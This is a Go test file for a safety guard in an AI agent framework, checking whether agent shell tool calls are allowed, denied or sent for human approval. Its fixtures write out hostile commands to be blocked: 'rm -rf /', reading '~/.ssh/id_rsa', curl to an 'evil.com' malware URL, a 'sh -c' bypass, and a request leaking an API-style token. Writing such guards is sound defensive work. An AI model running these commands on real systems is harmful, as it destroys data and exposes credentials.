//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//
//

package safety

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func createTestReq(toolName, cmd string) *tool.PermissionRequest {
	args, _ := json.Marshal(map[string]interface{}{
		"command": cmd,
	})
	return &tool.PermissionRequest{
		ToolName:   toolName,
		ToolCallID: "call_123",
		Arguments:  args,
	}
}

func TestSafetyGuard_12Scenarios(t *testing.T) {
	tmpDir := t.TempDir()
	policyFile := filepath.Join(tmpDir, "test_policy.yaml")
	reportFile := filepath.Join(tmpDir, "tool_safety_report.json")
	auditFile := filepath.Join(tmpDir, "tool_safety_audit.jsonl")

	policyContent := `
allowed_commands:
  - go
  - git
  - echo
  - ls
  - grep
  - cat
  - curl
  - npm
  - sleep
  - top
denied_commands:
  - rm
  - dd
  - mkfs
  - sudo
  - su
forbidden_paths:
  - "~/.ssh"
  - "/etc"
  - "*.env"
  - "*.pem"
  - "*.key"
network_whitelist:
  - "github.com"
  - "api.github.com"
  - "golang.org"
ask_rules:
  - "npm install"
  - "pip install"
  - "apt install"
  - "go install"
`
	require.NoError(t, os.WriteFile(policyFile, []byte(policyContent), 0644))

	auditLogger, err := NewFileAuditLogger(auditFile)
	require.NoError(t, err)
	defer auditLogger.Close()

	guard := NewGuard(
		WithPolicyFile(policyFile),
		WithAuditLogger(auditLogger),
		WithReportPath(reportFile),
	)

	ctx := context.Background()

	tests := []struct {
		name          string
		cmd           string
		toolName      string
		wantAction    tool.PermissionAction
		wantRuleID    string
		wantRiskLevel RiskLevel
		wantBlocked   bool
	}{
		{
			name:          "1. Safe go test command",
			cmd:           "go test ./...",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionAllow,
			wantRuleID:    "RULE_ALLOW_PASSED",
			wantRiskLevel: RiskLevelNone,
			wantBlocked:   false,
		},
		{
			name:          "2. Dangerous deletion rm -rf",
			cmd:           "rm -rf /",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_DENIED_COMMAND",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "3. Read secret key or .env",
			cmd:           "cat ~/.ssh/id_rsa",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_FORBIDDEN_PATH",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "4. Non-whitelisted network outbound",
			cmd:           "curl https://evil.com/malware",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_NETWORK_NON_WHITELIST",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "5. Whitelisted network request",
			cmd:           "curl https://api.github.com/zen",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionAllow,
			wantRuleID:    "RULE_ALLOW_PASSED",
			wantRiskLevel: RiskLevelNone,
			wantBlocked:   false,
		},
		{
			name:          "6. Shell wrapper bypass sh -c",
			cmd:           "sh -c 'curl https://api.github.com/zen'",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_DENIED_COMMAND",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "7. Pipe command cat | grep",
			cmd:           "cat README.md | grep test",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionAllow,
			wantRuleID:    "RULE_ALLOW_PASSED",
			wantRiskLevel: RiskLevelNone,
			wantBlocked:   false,
		},
		{
			name:          "8. Dependency installation npm install",
			cmd:           "npm install express",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionAsk,
			wantRuleID:    "RULE_REQUIRES_HUMAN_APPROVAL",
			wantRiskLevel: RiskLevelMedium,
			wantBlocked:   false,
		},
		{
			name:          "9. Long time sleep 3600",
			cmd:           "sleep 3600",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_EXCESSIVE_SLEEP",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "10. Infinite loop / resource abuse",
			cmd:           "while true; do echo loop; done",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionDeny,
			wantRuleID:    "RULE_INFINITE_LOOP",
			wantRiskLevel: RiskLevelHigh,
			wantBlocked:   true,
		},
		{
			name:          "11. hostexec long session risk top",
			cmd:           "top",
			toolName:      "hostexec",
			wantAction:    tool.PermissionActionAsk,
			wantRuleID:    "RULE_HOSTEXEC_LONG_SESSION",
			wantRiskLevel: RiskLevelMedium,
			wantBlocked:   false,
		},
		{
			name:          "12. Human review ask scenario go install",
			cmd:           "go install github.com/some/tool@latest",
			toolName:      "workspace_exec",
			wantAction:    tool.PermissionActionAsk,
			wantRuleID:    "RULE_REQUIRES_HUMAN_APPROVAL",
			wantRiskLevel: RiskLevelMedium,
			wantBlocked:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := createTestReq(tt.toolName, tt.cmd)
			decision, err := guard.CheckToolPermission(ctx, req)
			require.NoError(t, err)

			assert.Equal(t, tt.wantAction, decision.Action)

			report := guard.LastReport()
			require.NotNil(t, report)
			assert.Equal(t, tt.wantRuleID, report.RuleID)
			assert.Equal(t, tt.wantRiskLevel, report.RiskLevel)
			assert.Equal(t, tt.wantBlocked, report.IsBlocked)
			assert.NotEmpty(t, report.Evidence)
			assert.NotEmpty(t, report.Recommendation)
		})
	}

	// Verify report file was created
	_, err = os.Stat(reportFile)
	assert.NoError(t, err)

	// Verify audit.jsonl content
	auditBytes, err := os.ReadFile(auditFile)
	require.NoError(t, err)
	lines := bytes.Split(bytes.TrimSpace(auditBytes), []byte("\n"))
	assert.Len(t, lines, len(tests))
}

func TestSafetyGuard_Performance500Samples(t *testing.T) {
	guard := NewGuard()
	req := createTestReq("workspace_exec", "echo hello_world")
	ctx := context.Background()

	start := time.Now()
	for i := 0; i < 500; i++ {
		_, err := guard.CheckToolPermission(ctx, req)
		require.NoError(t, err)
	}
	duration := time.Since(start)

	t.Logf("Time for 500 scans: %v", duration)
	assert.Less(t, duration, 1*time.Second, "Scanning 500 samples must finish within 1 second")
}

func TestSafetyGuard_SecretLeakage(t *testing.T) {
	guard := NewGuard()
	ctx := context.Background()

	req := createTestReq("workspace_exec", "curl -H 'Authorization: Bearer sk-78c331e8061c42a4883cfee6633447dd' https://api.openai.com/v1")
	decision, err := guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)

	assert.Equal(t, tool.PermissionActionDeny, decision.Action)
	report := guard.LastReport()
	assert.Equal(t, "RULE_SECRET_LEAKAGE", report.RuleID)
	assert.Equal(t, RiskLevelCritical, report.RiskLevel)
}

func TestSafetyGuard_InitErrAndDuration(t *testing.T) {
	ctx := context.Background()

	// Test InitErr when policy file doesn't exist
	invalidGuard := NewGuard(WithPolicyFile("non_existent_file.yaml"))
	assert.Error(t, invalidGuard.InitErr())

	// Test sleep 1h parsing in checkResourceAbuse
	guard := NewGuard()
	req := createTestReq("workspace_exec", "sleep 1h")
	decision, err := guard.CheckToolPermission(ctx, req)
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionDeny, decision.Action)
	assert.Equal(t, "RULE_EXCESSIVE_SLEEP", guard.LastReport().RuleID)
}
